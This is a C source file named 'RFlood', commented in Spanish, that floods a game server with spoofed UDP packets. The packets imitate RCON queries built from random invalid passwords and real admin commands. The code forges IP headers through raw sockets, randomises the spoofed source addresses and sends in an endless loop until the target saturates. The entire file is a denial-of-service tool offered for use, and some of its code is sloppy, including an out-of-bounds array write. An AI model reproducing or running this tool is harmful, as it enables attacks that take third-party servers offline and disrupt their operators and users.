/*
RFlood envía paquetes UDP con el payload similar a los de los comandos RCON.
Se utilizan contraseñas inválidas para enviar comandos reales, así hasta que el servidor se satura.
Solo funciona en servidores con la rcon password activada.
*/
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
 
#define MAXSIZECMD 50
#define LEN 512
#define VECTOR 22

typedef unsigned short u16;
typedef unsigned long u32;


    char comandos[15][16] = {"cmdlist", "varlist", "exit", "echo", "hostname", "gamemodetext", "mapname", "kick", "ban", "rcon_password", "players", "say", "gmx", "loadfs", "language"};
    char abc[] = "abcdefghijklmnopqrstuvwxyz0123456789.";

//2nd
unsigned short csum (unsigned short *buf, int nwords);
uint16_t udp_checksum(const struct iphdr  *ip,
        const struct udphdr *udp,
        const uint16_t *buf);
 
 unsigned char ip[4];
 


void makeArrayIP(char* inIP, char *outIP){
    short i,nTemp=0; char cbool=0;
    for(i=0;inIP[i] != NULL;i++){
        if(inIP[i] != '.'){
            nTemp = nTemp*10 + (short)(inIP[i] - '0');
        }else{
            outIP[cbool] = (char) nTemp;
            nTemp = 0; /*Reiniciar el valor temporal*/
            cbool++;
           }
     
 
    }
    outIP[cbool] = (char) nTemp;
}
 

 
int main(int argc, char * argv[])
{
 
    if(argc < 3)
    {
        printf("- Usage %s <IP> <Port>\n", argv[0]);
        exit(1);
    }
    srand(time(NULL));

    char packet_dup[4];  
    makeArrayIP(argv[1],&ip[0]);  
    packet_dup[0] = ip[0];
    packet_dup[1] = ip[1];
    packet_dup[2] = ip[2];
    packet_dup[3] = ip[3];
   
    while(1)
    {
   int iprang[3];
        iprang[0] = 186;
        iprang[1] = 181;
        iprang[2] = 201;
        iprang[3] = 190;
  char ip_d[20];
    sprintf(ip_d, "%d.%d.%d.%d", iprang[rand() % 3],rand() % 250,rand() % 252,rand() % 208);
    int s_port = 1024 + (rand() % 48422);
    int PSOURCE = s_port;
    int PDEST = atoi(argv[2]);
    char * SOURCE = ip_d;
    char * DEST = argv[1];
    int s;
    struct sockaddr_in daddr, saddr, answerip;
    char packet[LEN];
//=============RCON==============//
    char rpaswd[6 + rand() % 6];
    for(int i = 0; i != sizeof(rpaswd); i++) rpaswd[i] = abc[rand() % 38];
    int sizepaswd = sizeof(rpaswd);
        int ncmd = (rand() % 9);
        char cmdstring[MAXSIZECMD];
        sprintf(cmdstring,"%s ", comandos[ncmd]);
        int scmd = strlen(comandos[ncmd]) + 1;
        int sizerand = 4 + sizepaswd + scmd + 3 + (rand() % 20);
        for(int i = scmd; i != sizerand; i++) cmdstring[i] = abc[rand() % 38];
 //RCON           =======//

    struct iphdr *ip = (struct iphdr *)packet;  
    struct udphdr *udp = (struct udphdr *)((void *) ip + sizeof(struct iphdr));
    struct dnshdr *dns = (struct dnshdr *)((void *) udp + sizeof(struct udphdr));
 
    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("error:");
        exit(EXIT_FAILURE);
    }
 
    daddr.sin_family = AF_INET;
    saddr.sin_family = AF_INET;
    daddr.sin_port = htons(PDEST);
    saddr.sin_port = htons(PSOURCE);
    inet_pton(AF_INET, DEST, (struct in_addr *)&daddr.sin_addr.s_addr);
    inet_pton(AF_INET, SOURCE, (struct in_addr *)&saddr.sin_addr.s_addr);
 
    memset(daddr.sin_zero, 0, sizeof(daddr.sin_zero));
    memset(saddr.sin_zero, 0, sizeof(saddr.sin_zero));
    memset(udp, 0, sizeof(struct udphdr));
    memset(ip, 0, sizeof(struct iphdr));
 
    ip->ihl = 5; //header length
    ip->version = 4;
    ip->tos = 0x0;
    ip->id = rand();
    ip->frag_off = 0;  
    ip->ttl = 90 + rand() % 40;          /* default value */
    ip->protocol = 17;  //IPPROTO_RAW;  /* protocol at L4 */
    ip->check = 0;          /* not needed in iphdr */
    ip->saddr = saddr.sin_addr.s_addr;
    ip->daddr = daddr.sin_addr.s_addr;
 
    udp->source = htons(PSOURCE);
    udp->dest = htons (PDEST);
 
       char incoming[11];
    int sizedata = sizeof(incoming) + sizerand;
   
    register char * packet_pos  = ((void *) udp) + sizeof(struct udphdr);
   
    

    memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata);
    packet_pos[11] = (char)(sizepaswd & 0xFFFF);
    packet_pos[12] = (char)(sizepaswd >> 8 & 0xFFFF);
    int xd, xf;
    xd = 0;
    xf = 0;
    for(int i = 13; xd != sizepaswd; i++)
    {
    packet_pos[i] = rpaswd[xd]; 
    xd++;
    }
    packet_pos[xd] = (char)(sizerand & 0xFFFF);
    xd++;
    packet_pos[xd] = (char)(sizerand >> 8 & 0xFFFF);
    for(int i = 13 + xd; xf != sizerand; i++){
    packet_pos[i] = cmdstring[xf];
    xf++;
    }
    packet_pos[0] = 0x53;  
    packet_pos[1] = 0x41;
    packet_pos[2] = 0x4d;
    packet_pos[3] = 0x50;  
    packet_pos[4] = packet_dup[0];
    packet_pos[5] = packet_dup[1];
    packet_pos[6] = packet_dup[2];
    packet_pos[7] = packet_dup[3];
    packet_pos[8] = (char)(PDEST & 0xFFFF);
    packet_pos[9] = (char)(PDEST >> 8 & 0xFFFF);
    packet_pos[10] = 0x78; // QUERY RCON
    
   memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, sizedata);
   
    int sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
    int optval = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int))
            < 0)
        perror ("IP HDRINCL");
        int sizepacket = sizeof(struct iphdr) + sizeudpdata;
    udp->check = 0;
    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);
//for(int i = 0; i != sizedata; i++) printf("%d) %c - %02x\n", i, packet_pos[i], packet_pos[i]);
 //   printf("%d[rpaswd] - %d[rcmd]\n", xd, xf);
sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;     
            close(s);
	usleep(1);        
    }
    exit(EXIT_SUCCESS);
}
 
//http://www.linuxquestions.org/questions/linux-networking-3/udp-checksum-algorithm-845618/
//modified by Gabriel Serme
struct pseudo_hdr {
    u_int32_t source;
    u_int32_t dest;
    u_int8_t zero; //reserved, check http://www.rhyshaden.com/udp.htm
    u_int8_t protocol;
    u_int16_t udp_length;
};
 
uint16_t udp_checksum(const struct iphdr  *ip,
        const struct udphdr *udp,
        const uint16_t *buf)
{
    //take in account padding if necessary
    int calculated_length = ntohs(udp->len)%2 == 0 ? ntohs(udp->len) : ntohs(udp->len) + 1;
 
    struct pseudo_hdr ps_hdr = {0};
    bzero (&ps_hdr, sizeof(struct pseudo_hdr));
    uint8_t data[sizeof(struct pseudo_hdr) + calculated_length];
    bzero (data, sizeof(struct pseudo_hdr) + calculated_length );
 
    ps_hdr.source = ip->saddr;
    ps_hdr.dest = ip->daddr;
    ps_hdr.protocol = IPPROTO_UDP; //17
    ps_hdr.udp_length = udp->len;
 
    memcpy(data, &ps_hdr, sizeof(struct pseudo_hdr));
    memcpy(data + sizeof(struct pseudo_hdr), buf, ntohs(udp->len) ); //the remaining bytes are set to 0
 
    return csum((uint16_t *)data, sizeof(data)/2);
}
 
/* Not my code */
unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum;
 
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
 
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}
